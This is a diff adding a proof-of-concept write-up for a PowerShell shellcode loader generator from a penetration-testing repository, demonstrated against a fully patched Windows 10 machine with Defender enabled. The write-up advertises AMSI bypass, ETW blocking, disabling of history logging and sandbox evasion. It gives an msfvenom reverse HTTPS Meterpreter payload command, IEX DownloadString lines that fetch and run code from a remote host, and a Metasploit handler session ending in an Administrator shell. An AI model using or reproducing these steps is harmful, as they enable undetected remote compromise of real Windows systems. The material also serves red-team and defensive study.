@@ -1,0 +1,126 @@
+================================================================================================================================================
+AV bypass using my PowerShell Shellcodeloader 'Invoke-PoSH-ShellCodeLoader1.ps1'
+================================================================================================================================================
+
+'Invoke-PoSH-ShellCodeLoader1' is a shellcode loader generator that aims to bypass AV solutions such as Windows Defender.
+It generates an obfuscated and encrypted shellcode loader script that will inject the shellcode into the current process's virtual address space.
+
+=> URL: https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-ShellCodeLoader
+
+Features
+---------
+- Shellcode injection into the memory of the current process (PowerShell)
+- AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+- AMSI bypass
+- Blocking Event Tracing for Windows (ETW)
+- Disabling PowerShell history logging
+- Basic sandbox evasion techniques (optional)
+  + stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
+  + wait for 60 seconds before execution
+
+
+=====================================================================================================================================================
+PoC 1 - Example with a (x64) Meterpreter reverse HTTPS shell running on a Windows 10 laptop fully patched with MS Defender AV enabled and up-to-date
+=====================================================================================================================================================
+
+Step 1 - Generate a staged (x64) Meterpreter reverse HTTPS shellcode in PowerShell format
+------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/Windows$ msfvenom -p windows/x64/meterpreter/reverse_https EXITFUNC=thread LHOST=192.168.56.104 LPORT=443 -a x64 -f ps1 -o /shellcodeMSFstagedHTTPS
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 736 bytes
+Final size of ps1 file: 3603 bytes
+Saved as: shellcodeMSFstagedHTTPS
+
+
+Step 2 - Create an obfuscated & encrypted shellcode loader script using 'Invoke-PoSH-ShellCodeLoader1.ps1'
+-----------------------------------------------------------------------------------------------------------
+
+PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://github.com/Jean-Francois-C/Windows-Penetration-Testing/raw/master/Defense%20evasion%20(examples)/Invoke-PoSH-ShellCodeLoader/Invoke-PoSH-ShellCodeLoader1.ps1');
+
+  ___     ___ _  _     ___ _        _ _  ___         _     _                _
+ | _ \___/ __| || |___/ __| |_  ___| | |/ __|___  __| |___| |   ___  __  __| |___ ___
+ |  _/ _ \__ \ __ |___\__ \ ' \/ -_) | | (__/ _ \/ _  / -_| |__/ _ \/ _|/ _  / -_)  _|
+ |_| \___/___/_||_|   |___/_||_\___|_|_|\___\___/\__,_\___|____\___/\__,\__,_\___|_|
+                                                                                     v1.1
+Usage:
+> Import-Module ./Invoke-PoSH-ShellCodeLoader1.ps1
+> Invoke-PoSH-ShellCodeLoader1 -FileUrl https://URL/shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
+> Invoke-PoSH-ShellCodeLoader1 -FilePath C:\path\shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
+
+Features:
+[*] Shellcode injection into the memory of the current process
+[*] AES encryption and GZip/Deflate compression
+[*] AMSI bypass
+[*] Blocking Event Tracing for Windows (ETW)
+[*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
+
+PS C:\temp> Invoke-PoSH-ShellCodeLoader1 -FileUrl http://192.168.56.104:8081/shellcodeMSFstagedHTTPS -OutFile C:\temp\packed-MSF-agent.ps1 -Sandbox
+[*] Downloading the remote file: 'http://192.168.56.104:8081/shellcodeMSFstagedHTTPS'
+[*] Creating the ShellCode loader script
+[*] File compression (GZip/Deflate)
+[*] File encryption (AES)
+[*] Adding basic sandbox checks
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] The obfuscated & encrypted shellcode loader script has been saved: 'C:\temp\packed-MSF-agent.ps1' ...
+[+] Done!
+
+
+Step 3 - Download & execute into memory the encrypted shellcode loader script 'packed-MSF-agent.ps1' without being detected by Windows Defender
+         on a Windows 10 laptop fully patched (with MS Defender AV enabled and up-to-date)
+------------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 01/02/2023 05:44:20
+
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/packed-MSF-agent.ps1');
+
+
+Step 4 - You have now a Meterpreter shell running 
+---------------------------------------------------
+
+jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.56.104; set LPORT 443; set EXITFUNC thread; run -j"
+[sudo] password for jeff:
+
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 46 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Enable verbose logging with set VERBOSE
+true
+
+[*] Starting persistent handler(s)...
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_https
+LHOST => 192.168.56.104
+LPORT => 443
+EXITFUNC => thread
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/handler) >
+msf6 exploit(multi/handler) >
+[*] Started HTTPS reverse handler on https://192.168.56.104:443
+[*] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: hcg35ala) Staging x64 payload (201308 bytes) ...
+[*] Meterpreter session 1 opened (192.168.56.104:443 -> 127.0.0.1 ) at 2023-02-02 02:49:14 +0100
+
+msf6 exploit(multi/handler) >
+
+msf6 exploit(multi/handler) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: Laptop1\Administrator
+
+meterpreter >
+
+<SNIP>
